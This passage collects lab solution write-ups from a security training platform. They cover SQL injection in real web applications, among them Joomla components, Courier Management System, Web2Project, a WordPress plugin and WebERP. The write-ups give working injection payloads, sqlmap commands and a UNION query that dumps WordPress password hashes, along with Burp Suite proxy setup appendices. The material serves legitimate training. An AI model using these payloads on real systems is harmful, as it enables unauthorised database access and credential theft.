%30%78%33%63%36%32%37%32%33%65%29%20%46%52%4f%4d%20%49%4e%46%4f%
52%4d%41%54%49%4f%4e%5f%53%43%48%45%4d%41%2e%54%41%42%4c%45%53%20
%57%48%45%52%45%20%54%41%42%4c%45%5f%53%43%48%45%4d%41%3d%44%41
%54%41%42%41%53%45%28%29%29%2c%28%53%45%4c%45%43%54%20%28%45%4c
%54%28%31%3d%31%2c%31%29%29%29%2c%64%61%74%61%62%61%73%65%28%29
%29%29%2d%2d%20%56%65%72%41%79%61%72%69 
 
 
 
 
Two Table name from INFORMATION_SCHEMA.TABLES is dumped. 
 
Step 4: ​Modify the URL used in previous step to dump MySQL server version.  
 
 
 
 
 
Modified URL: 
http://e921wleuf65ox8uffmzliq0ri.public2.attackdefenselabs.com/index.php?option=com_prayerc
enter&task=confirm&id=1&sessionid=1%27%20AND%20EXTRACTVALUE%2822%2cCONCAT
%280x5c%2c%28SELECT%20GROUP_CONCAT%28version()%20SEPARATOR%200x3c627
23e%29%20FROM%20INFORMATION_SCHEMA%2eTABLES%20WHERE%20TABLE_SCHE
MA%3dDATABASE%28%29%29%2c%28SELECT%20%28ELT%281%3d1%2c1%29%29%29
%2cdatabase%28%29%29%29--%20VerAyari 
 
 
 
 
The MySQL server version information is revealed.  
 
 
References:  
 
1.
PrayerCenter 
 (​https://extensions.joomla.org/extension/prayercenter/​)  
2.
Joomla! Component PrayerCenter 3.0.2 - 'sessionid' SQL Injection 
(​https://www.exploit-db.com/exploits/44160​)  
 
 
 
 
 
Name 
Courier Management System 
URL 
https://www.attackdefense.com/challengedetails?cid=268  
Type 
Real World Webapps : SQL Injection 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
Step 2: ​Search on google “courier management system sql injection” and look for publically 
available exploits.  
 
 
 
 
 
The exploit db link contains sqlmap payloads which can be used to  exploit the SQL Injection 
vulnerability.  
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/41113  
 
 
 
Step 3: ​Click on the “click here” hyperlink below the “ADMIN Login:” section on the bottom right 
corner.  
 
 
 
 
Admin Login Panel:  
 
 
 
Step 4: ​To exploit the SQLI vulnerability, it is required to send a POST request with injected sqli 
payload to “login.php” web page. Configure burp suite to intercept request. 
 
Step 5: ​Enter any credential on the login page and click “Login Now”. The request will be 
intercepted by Burp suite.  
 
 
 
The request was intercepted by burp suite. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Right click on the request and click on “Send to Repeater”, the same can be achieved by 
pressing “CTRL+R” 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Repeater Tab:  
 
 
 
Step 6: ​Inject the payload provided at exploit db link into the request and exploit the 
vulnerability.  
 
Modify the POST data in the request:  
 
Before:  
txtusername=admin&txtpassword=password&OfficeName=Fast+Courier+-+Jalgaon&Submit=Lo
gin+Now 
 
After:  
txtusername=test&txtpassword=test' AND (SELECT 9962 FROM(SELECT 
COUNT(*),CONCAT(0x71766a6b71,(SELECT 
(ELT(9962=9962,1))),0x717a6b7871,FLOOR(RAND(0)*2))x FROM 
INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- CqJl&OfficeName=Fast Courier - 
Jalgaon&Submit=Login Now 
 
Request section in Repeater Tab:  
 
 
 
Click on the Go button. 
 
Response section in the Repeater tab. 
 
 
 
The injected SQLI payload was executed.  
 
Step 7: ​Modify the payload used in previous step to retrieve the MySQL Server version 
information. 
 
Before:  
txtusername=test&txtpassword=test' AND (SELECT 9962 FROM(SELECT 
COUNT(*),CONCAT(0x71766a6b71,(SELECT 
(ELT(9962=9962,1))),0x717a6b7871,FLOOR(RAND(0)*2))x FROM 
INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- CqJl&OfficeName=Fast Courier - 
Jalgaon&Submit=Login Now 
 
After:  
txtusername=test&txtpassword=test' AND (SELECT 9962 FROM(SELECT 
COUNT(*),CONCAT(version(),(SELECT 
(ELT(9962=9962,1))),0x717a6b7871,FLOOR(RAND(0)*2))x FROM 
INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- CqJl&OfficeName=Fast Courier - 
Jalgaon&Submit=Login Now 
 
 
 
Request section in Repeater Tab: 
 
 
Click on the Go button. 
 
Response section in Repeater Tab: 
 
 
 
The MySQL Server version information was revealed. 
 
 
References:  
 
1.
Courier Management System (​https://sourceforge.net/projects/couriermanageme/​)  
2.
Courier Management System - SQL Injection 
(​https://www.exploit-db.com/exploits/41113​)  
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Appendix  
 
 
Appendix A: Configuration for Windows OS 
     A.1 Google Chrome with Burp Suite 
     A.2 Mozilla Firefox with Burp Suite 
 
Appendix B: Configuration for Kali OS 
                B.1 Google Chrome with Burp Suite 
    B.2 Mozilla Firefox with Burp Suite 
 
Appendix C: Configuration for FoxyProxy Standard plugin 
    C.1 FoxyProxy on Google Chrome with Burp Suite 
    C.2 FoxyProxy on Mozilla Firefox with Burp Suite 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Appendix A 
 
A.1 Google Chrome with Burp Suite (Windows OS) 
 
Step 1: ​Open Google Chrome and navigate to the URL given below. 
 
URL: ​chrome://settings 
 
 
 
Google Chrome Settings page will appear. 
 
Step 2:​ Search for “proxy” in the search box. 
 
 
 
 
 
 
 
 
 
Step 3: ​Upon clicking on “Open proxy settings”, Windows “Internet Properties” settings dialog 
box will appear. Click on “LAN settings” button. 
 
 
 
Step 4: ​Select the checkbox “Use a proxy server for your LAN (These settings will not apply to 
dial-up or VPN connections)”. And  enter “127.0.0.1” and “8080” in “Address” textbox and “Port” 
textbox respectively.  
 
 
 
Click “OK” on the “Local Area Network (LAN) Settings” dialog box and close the “Internet 
Properties” dialog box. 
 
Step 5: ​Start Burp suite. 
 
 
 
Step 6: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
All the HTTP request made by Google Chrome will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
A.2 Mozilla Firefox with burp suite (Windows OS) 
 
Step 1: ​Open Mozilla Firefox and navigate to the URL given below. 
 
URL: ​about:preferences 
 
 
 
Step 2: ​Scroll down to the bottom of the page and click on “Settings” button under “Network 
Settings” section. 
 
 
 
 
 
 
Step 3:  ​Enter “127.0.0.1” and “8080” in “HTTP Proxy” textbox and “Port” textbox respectively. 
 
 
 
Click on the OK button.  
 
Step 4: ​Start Burp suite. 
 
 
 
Step 5: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
All the HTTP request made by Mozilla Firefox will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
Appendix B 
 
B.1 Google Chrome with Burp Suite (Kali OS) 
 
Step 1: ​Open Google Chrome and navigate to the URL given below. 
 
URL: ​chrome://settings 
 
 
 
Google Chrome Settings page will appear. 
 
Step 2:​ Search for “proxy” in the search box. 
 
 
 
 
 
 
Step 3: ​Upon clicking on “Open proxy settings”, The “Networks” settings window will appear. 
Click on Network Proxy option. 
 
 
 
 
Step 4: ​Enter “127.0.0.1” in “HTTP Proxy” textbox and enter 8080 as port.  
 
 
 
Close the dialog box.  
 
Step 5: ​Start Burp suite. 
 
 
 
 
Step 6: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
 
 
 
 
All the HTTP/HTTPS request made by Google Chrome will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
B.2 Mozilla Firefox with burp suite (Kali OS) 
 
Step 1: ​Open Mozilla Firefox and navigate to the URL given below. 
 
URL: ​about:preferences 
 
 
 
 
Step 2: ​Click on “Advanced” tab on the left panel and then click on “Settings” button under 
“Network” tab. 
 
 
 
 
 
 
 
 
Step 3:  ​Enter “127.0.0.1” and “8080” in “HTTP Proxy” textbox and “Port” textbox respectively. 
 
 
 
Step 4: ​Start Burp suite. 
 
 
 
 
 
Step 5: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
 
 
All the HTTP request made by Mozilla Firefox will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
Appendix C 
 
C.1 FoxyProxy on Google Chrome with Burp Suite 
 
Step 1: ​Installing FoxyProxy. 
 
FoxyProxy Standard plugin for Google Chrome can be installed from the URL given below: 
 
URL: 
https://chrome.google.com/webstore/detail/foxyproxy-standard/gcknhkkoolaabfmlnjonogaaifnjlfn
p?hl=en 
 
After installing FoxyProxy, a small fox icon will appear on the right side of the address bar.  
 
 
 
 
 
Step 2: ​Click on the FoxyProxy icon and click on Options. 
 
 
 
Step 3: ​Click on the “Add New Proxy” Button.  
 
 
 
Step 4: ​Enter “127.0.0.1” in “Host or IP Address” textbox and enter “8080” in Port textbox. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Click on the Save button. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
The configured proxy will appear in the proxies table. 
 
Step 5: ​Enable the proxy. 
 
Click on the FoxyProxy icon and select the option “Use proxy 127.0.0.1:8080 for all URLs” 
 
 
 
The FoxyProxy icon will change its color (In this case it is blue). 
 
 
 
 
 
 
 
Step 6: ​Start Burp suite. 
 
 
 
Step 7: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
All the HTTP/HTTPS request made by Google Chrome will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
C.2 FoxyProxy on Mozilla Firefox with Burp Suite 
 
Step 1: ​Installing FoxyProxy. 
 
FoxyProxy Standard plugin for Mozilla Firefox can be installed from the URL given below: 
 
URL: ​https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/ 
 
After installing FoxyProxy, a small fox icon will appear on the right side of the address bar.  
 
 
 
Step 2: ​Click on the FoxyProxy icon and click on Options. 
 
 
 
 
 
Step 3: ​Click on the add button on the left panel 
 
 
 
Step 4: ​Enter “127.0.0.1” in “IP Address, DNS name, server name” textbox and enter “8080” in 
Port textbox. 
 
 
 
Click on the Save button. 
 
 
 
The proxy will appear in the proxies table. 
 
Step 5: ​Enable the proxy. 
 
Click on the FoxyProxy icon and select the option “Use proxy 127.0.0.1:8080 for all URLs 
(ignore patterns)” 
 
 
 
The FoxyProxy icon will change its color (In this case it is green). 
 
Step 6: ​Start Burp suite. 
 
 
 
Step 7: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080” 
 
 
 
All the HTTP/HTTPS request made by Mozilla Firefox will be intercepted by Burp Suite.  
 
 
 
 
Name 
Web2Project 
URL 
https://www.attackdefense.com/challengedetails?cid=269  
Type 
Real World Webapps : SQL Injection 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
The version of web2project is 3.1.0 (The version information is mentioned below the login panel)  
 
Step 2: ​Search on google “web2project 3.1 sql injection” and look for publically available 
exploits.  
 
 
 
 
The exploit db link contains the SQLI payload and information regarding the vulnerable 
parameter required to exploit the SQL Injection vulnerability.  
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/33818  
 
 
 
 
Step 3: ​The user has to be authenticated in order to exploit the vulnerability. Login to the web 
application. 
 
The login credential of the web application is provided in the challenge description. 
 
●
Username: admin 
●
Password: password1 
 
 
 
 
 
 
Dashboard: 
 
 
 
Step 4: ​Exploit the SQL injection vulnerability and retrieve MySQL server version information.  
 
 
The analysis of the html code provided at exploit db link reveals that the “search_string” 
parameter is vulnerable to SQL Injection. As the name suggests “search_string”, the parameter 
corresponds to the search text field in the contacts module. 
 
Click on the Contacts tab.  
 
 
 
 
 
 
In the search field, inject the payload provided at exploit db link: 
 
Payload: ​'and(select 1 from(select count(*),concat((select version() from 
information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by 
x)a)and' 
 
 
 
Hit the Enter key. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
The MySQL Server version is revealed.  
 
References:  
 
1.
web2Project 
 (​https://web2project.net/​)  
2.
web2Project 3.1 - Multiple Vulnerabilities 
(​https://www.exploit-db.com/exploits/33818​)  
 
 
 
 
 
Name 
WordPress Opt-In Download 
URL 
https://www.attackdefense.com/challengedetails?cid=270  
Type 
Real World Webapps : SQL Injection 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
Step 2: ​Search on google “Wordpress Opt-In Download sql injection” and look for publically 
available exploits.  
 
 
 
 
The exploit db link contains the html form required to exploit the vulnerability.  
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/39896 
 
 
 
 
 
 
 
 
Step 3: ​The user has to authenticate in order to exploit the vulnerability. Login to the web 
application. 
 
Click on the “Log In” hyperlink under the META section. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
The login credential of the web application are provided in the challenge description. 
 
●
Username: pentester 
●
Password: password1 
 
 
 
 
Step 4: ​Copy the html form provided at the exploit db link and modify the URL in the html form. 
 
 
 
 
Step 5: ​Open the html page in the same web application session. 
 
 
Click on the Send Button. 
 
 
 
The password hash of wordpress user is revealed.  
 
 
 
 
 
 
 
 
Step 6: ​Navigate to previous page and modify the payload to retrieve the MySQL server version 
information.  
 
Modified Payload: ​0 UNION SELECT version(), 2, 4, 5, 6, 7, user_pass FROM wp_users 
WHERE ID=1 
 
 
Click on the Send Button. 
 
 
 
The MySQL Server version is revealed.  
 
 
References:  
 
1.
Double Opt-In for Download (​https://github.com/wp-plugins/double-opt-in-for-download​)  
2.
WordPress Plugin Double Opt-In for Download 2.0.9 - SQL Injection 
(​https://www.exploit-db.com/exploits/39896​)  
 
 
 
 
 
Name 
Joomla NextGen Component 
URL 
https://www.attackdefense.com/challengedetails?cid=271  
Type 
Real World Webapps : SQL Injection 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
Step 2: ​Search on google “Joomla NextGen Component sql injection” and look for publically 
available exploits.  
 
 
 
 
The exploit db link contains the SQLI payload and information regarding the vulnerable 
parameter required to  exploit the SQL Injection vulnerability.  
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/43365 
 
 
 
 
 
 
 
 
 
Step 3: ​Substitute the payload in the URL provided at exploit db link and exploit the SQL 
injection vulnerability. 
 
Payload: 
%22%20%20%2f%2a%21%30%37%37%37%37%50%72%6f%63%65%64%75%72%65%2a%
2f%20%2f%2a%21%30%37%37%37%37%41%6e%61%6c%79%73%65%2a%2f%20%28%65
%78%74%72%61%63%74%76%61%6c%75%65%2800%2c%2f%2a%21%30%37%37%37%3
7%63%6f%6e%63%61%74%2a%2f%280x27%2c0x496873616e2053656e63616e%2c0x3a%2
c%40%40%76%65%72%73%69%6f%6e%29%29%2c0%29%2d%2d%20%2d 
 
 
 
 
 
 
URL: 
http://4mweqj44e505do38fva0hpcal.public1.attackdefenselabs.com/index.php?option=com_nge
&view=config&plname=%22%20%20%2f%2a%21%30%37%37%37%37%50%72%6f%63%65
%64%75%72%65%2a%2f%20%2f%2a%21%30%37%37%37%37%41%6e%61%6c%79%73%
65%2a%2f%20%28%65%78%74%72%61%63%74%76%61%6c%75%65%2800%2c%2f%2a%
21%30%37%37%37%37%63%6f%6e%63%61%74%2a%2f%280x27%2c0x496873616e20536
56e63616e%2c0x3a%2c%40%40%76%65%72%73%69%6f%6e%29%29%2c0%29%2d%2d%
20%2d 
 
 
 
The MySQL version information is revealed.  
 
 
References:  
 
1.
NextGen Editor 
 (​https://extensions.joomla.org/extension/nextgen-editor/​)  
2.
Joomla! Component NextGen Editor 2.1.0 - 'plname' SQL Injection 
(​https://www.exploit-db.com/exploits/43365​)  
 
 
 
 
 
Name 
WebERP 
URL 
https://www.attackdefense.com/challengedetails?cid=264  
Type 
Real World Webapps : SQL Injection 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
 
Solution:  
 
Step 1: ​Inspect the web application. 
 
 
 
 
 
Step 2: ​Search on google “WebERP sql injection” and look for publically available exploits.  
 
 
 
 
The exploit db link contains the information regarding the vulnerable parameter and the 
vulnerable web page. 
 
Exploit DB Link: ​https://www.exploit-db.com/exploits/31989 
 
 
 
 
Step 3: ​The user has to authenticate in order to exploit the vulnerability. Login to the web 
application. 
 
The login credential of the web application is provided in the challenge description. 
 
●
Username: admin 
●
Password: password 
 
 
 
 
 
 
 
 
 
 
 
 
Step 4: ​To exploit the vulnerability, a POST request with injected SQLI payload is to be sent to 
the vulnerable web page.  
 
Navigate to the URL given below: 
 
URL:​ http://0px74kijpnrri3mr322axk4k5.public2.attackdefenselabs.com/SalesInquiry.php 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Click on the “Run Inquiry” button and intercept the request with burp suite. 
 
Check Appendix to learn how to configure Burp Suite. 
 
Intercepted Request: 
 
 
 
Copy the request and save it in a file named “request”. 
 
Command: ​cat request 
 
 
 
Step 5: ​Find the payload using sqlmap. 
 
Vulnerable parameter:​  SortBy 
 
Command: ​sqlmap -r request -p SortBy 
 
Enter the following answers when asked for questions. 
 
“y” for “Do you want to skip test payloads specific for other DBMSes?” 
“n” for “do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) 
values?” 
“n” for “Do you want to keep testing the others (if any)?” 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Payloads: 
 
Type:​ boolean-based blind 
Payload: 
FormID=2edbf27c3d090dd6888420c9b9bc9e4fa88f7197&ReportType=Detail&OrderType=0&D
ateType=Order&InvoiceType=All&FromDate=01/06/2019&ToDate=18/06/2019&PartNumberOp
=Equals&PartNumber=&DebtorNoOp=Equals&DebtorNo=&DebtorNameOp=LIKE&DebtorName
=&OrderNo=&LineStatus=All&Category=All&Salesman=All&Area=All&SortBy=(SELECT (CASE 
WHEN (1928=1928) THEN 1928 ELSE 1928*(SELECT 1928 FROM 
INFORMATION_SCHEMA.PLUGINS) END))&SummaryType=orderno&submit=Run Inquiry 
 
Type:​ error-based 
Payload: 
FormID=2edbf27c3d090dd6888420c9b9bc9e4fa88f7197&ReportType=Detail&OrderType=0&D
ateType=Order&InvoiceType=All&FromDate=01/06/2019&ToDate=18/06/2019&PartNumberOp
=Equals&PartNumber=&DebtorNoOp=Equals&DebtorNo=&DebtorNameOp=LIKE&DebtorName
=&OrderNo=&LineStatus=All&Category=All&Salesman=All&Area=All&SortBy=salesorderdetails.
orderno AND (SELECT 2173 FROM(SELECT COUNT(*),CONCAT(0x71626b7071,(SELECT 
(ELT(2173=2173,1))),0x716b7a6271,FLOOR(RAND(0)*2))x FROM 
INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)&SummaryType=orderno&submit=Run 
Inquiry 
 
 
Step 6: ​Send the intercepted request to Repeater. 
 
Right click on the intercepted request and select the option “Send to Repeater”, the same can 
be achieved by pressing “CTRL+R”. 
 
 
 
 
 
 
 
 
Repeater Tab: 
 
 
 
Step 7: ​Inject the error based SQLI payload in POST data of the request and exploit the 
vulnerability. 
 
 
 
 
Before: 
FormID=2edbf27c3d090dd6888420c9b9bc9e4fa88f7197&ReportType=Detail&OrderType=0&D
ateType=Order&InvoiceType=All&FromDate=01%2F06%2F2019&ToDate=18%2F06%2F2019&
PartNumberOp=Equals&PartNumber=&DebtorNoOp=Equals&DebtorNo=&DebtorNameOp=LIK
E&DebtorName=&OrderNo=&LineStatus=All&Category=All&Salesman=All&Area=All&SortBy=s
alesorderdetails.orderno&SummaryType=orderno&submit=Run+Inquiry 
 
After: 
FormID=2edbf27c3d090dd6888420c9b9bc9e4fa88f7197&ReportType=Detail&OrderType=0&D
ateType=Order&InvoiceType=All&FromDate=01/06/2019&ToDate=18/06/2019&PartNumberOp
=Equals&PartNumber=&DebtorNoOp=Equals&DebtorNo=&DebtorNameOp=LIKE&DebtorName
=&OrderNo=&LineStatus=All&Category=All&Salesman=All&Area=All&SortBy=salesorderdetails.
orderno AND (SELECT 2173 FROM(SELECT COUNT(*),CONCAT(0x71626b7071,(SELECT 
(ELT(2173=2173,1))),0x716b7a6271,FLOOR(RAND(0)*2))x FROM 
INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)&SummaryType=orderno&submit=Run 
Inquiry 
 
Request section in the Repeater tab: 
 
 
 
Response section in the Repeater tab: 
 
 
 
The injected SQLI payload was executed. 
 
 
 
Step 8: ​Modify the payload used in previous step and retrieve the MySQL server version 
information.  
 
Before: 
FormID=2edbf27c3d090dd6888420c9b9bc9e4fa88f7197&ReportType=Detail&OrderType=0&D
ateType=Order&InvoiceType=All&FromDate=01/06/2019&ToDate=18/06/2019&PartNumberOp
=Equals&PartNumber=&DebtorNoOp=Equals&DebtorNo=&DebtorNameOp=LIKE&DebtorName
=&OrderNo=&LineStatus=All&Category=All&Salesman=All&Area=All&SortBy=salesorderdetails.
orderno AND (SELECT 2173 FROM(SELECT COUNT(*),CONCAT(0x71626b7071,(SELECT 
(ELT(2173=2173,1))),0x716b7a6271,FLOOR(RAND(0)*2))x FROM 
INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)&SummaryType=orderno&submit=Run 
Inquiry 
 
After: 
FormID=2edbf27c3d090dd6888420c9b9bc9e4fa88f7197&ReportType=Detail&OrderType=0&D
ateType=Order&InvoiceType=All&FromDate=01/06/2019&ToDate=18/06/2019&PartNumberOp
=Equals&PartNumber=&DebtorNoOp=Equals&DebtorNo=&DebtorNameOp=LIKE&DebtorName
=&OrderNo=&LineStatus=All&Category=All&Salesman=All&Area=All&SortBy=salesorderdetails.
orderno AND (SELECT 2173 FROM(SELECT COUNT(*),CONCAT(version(),(SELECT 
(ELT(2173=2173,1))),0x716b7a6271,FLOOR(RAND(0)*2))x FROM 
INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)&SummaryType=orderno&submit=Run 
Inquiry 
 
Request section in the Repeater tab: 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Response section in the Repeater tab: 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
MySQL server version information is revealed.  
 
 
 
 
 
References:  
 
1.
webERP (​http://www.weberp.org/​) 
 
2.
webERP 4.11.3 - 'SalesInquiry.php?SortBy' SQL Injection 
(​https://www.exploit-db.com/exploits/31989​) 
 
3.
Sqlmap (​http://sqlmap.org/​)  
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Appendix  
 
 
Appendix A: Configuration for Windows OS 
     A.1 Google Chrome with Burp Suite 
     A.2 Mozilla Firefox with Burp Suite 
 
Appendix B: Configuration for Kali OS 
                B.1 Google Chrome with Burp Suite 
    B.2 Mozilla Firefox with Burp Suite 
 
Appendix C: Configuration for FoxyProxy Standard plugin 
    C.1 FoxyProxy on Google Chrome with Burp Suite 
    C.2 FoxyProxy on Mozilla Firefox with Burp Suite 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Appendix A 
 
A.1 Google Chrome with Burp Suite (Windows OS) 
 
Step 1: ​Open Google Chrome and navigate to the URL given below. 
 
URL: ​chrome://settings 
 
 
 
Google Chrome Settings page will appear. 
 
Step 2:​ Search for “proxy” in the search box. 
 
 
 
 
 
 
 
 
 
Step 3: ​Upon clicking on “Open proxy settings”, Windows “Internet Properties” settings dialog 
box will appear. Click on “LAN settings” button. 
 
 
 
Step 4: ​Select the checkbox “Use a proxy server for your LAN (These settings will not apply to 
dial-up or VPN connections)”. And  enter “127.0.0.1” and “8080” in “Address” textbox and “Port” 
textbox respectively.  
 
 
 
Click “OK” on the “Local Area Network (LAN) Settings” dialog box and close the “Internet 
Properties” dialog box. 
 
Step 5: ​Start Burp suite. 
 
 
 
Step 6: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
All the HTTP request made by Google Chrome will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
A.2 Mozilla Firefox with burp suite (Windows OS) 
 
Step 1: ​Open Mozilla Firefox and navigate to the URL given below. 
 
URL: ​about:preferences 
 
 
 
Step 2: ​Scroll down to the bottom of the page and click on “Settings” button under “Network 
Settings” section. 
 
 
 
 
 
 
Step 3:  ​Enter “127.0.0.1” and “8080” in “HTTP Proxy” textbox and “Port” textbox respectively. 
 
 
 
Click on the OK button.  
 
Step 4: ​Start Burp suite. 
 
 
 
Step 5: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
All the HTTP request made by Mozilla Firefox will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
Appendix B 
 
B.1 Google Chrome with Burp Suite (Kali OS) 
 
Step 1: ​Open Google Chrome and navigate to the URL given below. 
 
URL: ​chrome://settings 
 
 
 
Google Chrome Settings page will appear. 
 
Step 2:​ Search for “proxy” in the search box. 
 
 
 
 
 
 
Step 3: ​Upon clicking on “Open proxy settings”, The “Networks” settings window will appear. 
Click on Network Proxy option. 
 
 
 
 
Step 4: ​Enter “127.0.0.1” in “HTTP Proxy” textbox and enter 8080 as port.  
 
 
 
Close the dialog box.  
 
Step 5: ​Start Burp suite. 
 
 
 
 
Step 6: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
 
 
 
 
All the HTTP/HTTPS request made by Google Chrome will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
B.2 Mozilla Firefox with burp suite (Kali OS) 
 
Step 1: ​Open Mozilla Firefox and navigate to the URL given below. 
 
URL: ​about:preferences 
 
 
 
 
Step 2: ​Click on “Advanced” tab on the left panel and then click on “Settings” button under 
“Network” tab. 
 
 
 
 
 
 
 
 
Step 3:  ​Enter “127.0.0.1” and “8080” in “HTTP Proxy” textbox and “Port” textbox respectively. 
 
 
 
 
Step 4: ​Start Burp suite. 
 
 
 
 
 
Step 5: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
 
 
All the HTTP request made by Mozilla Firefox will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
Appendix C 
 
C.1 FoxyProxy on Google Chrome with Burp Suite 
 
Step 1: ​Installing FoxyProxy. 
 
FoxyProxy Standard plugin for Google Chrome can be installed from the URL given below: 
 
URL: 
https://chrome.google.com/webstore/detail/foxyproxy-standard/gcknhkkoolaabfmlnjonogaaifnjlfn
p?hl=en 
 
After installing FoxyProxy, a small fox icon will appear on the right side of the address bar.  
 
 
 
 
 
Step 2: ​Click on the FoxyProxy icon and click on Options. 
 
 
 
Step 3: ​Click on the “Add New Proxy” Button.  
 
 
 
Step 4: ​Enter “127.0.0.1” in “Host or IP Address” textbox and enter “8080” in Port textbox. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Click on the Save button. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
The configured proxy will appear in the proxies table. 
 
Step 5: ​Enable the proxy. 
 
Click on the FoxyProxy icon and select the option “Use proxy 127.0.0.1:8080 for all URLs” 
 
 
 
